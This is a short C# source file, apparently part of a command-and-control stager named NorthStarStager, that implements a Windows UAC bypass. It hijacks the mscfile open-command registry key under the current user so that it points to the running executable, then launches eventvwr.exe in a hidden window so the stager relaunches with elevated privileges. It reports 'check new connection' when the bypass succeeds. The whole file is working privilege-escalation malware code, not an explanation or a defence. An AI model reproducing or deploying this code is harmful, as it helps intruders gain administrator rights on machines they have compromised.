using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace NorthStarStager
{
    class privilegeEscalation
    {

        public string _eventVwr()
        {
             try
            {
                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").SetValue("", System.Reflection.Assembly.GetEntryAssembly().Location);
                Process p = new Process();
                p.StartInfo.FileName = "eventvwr.exe";
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                return "Probably bypassed check new connection";
            }
            catch
            {
                return "System is patched";
            }
        }


    }
}
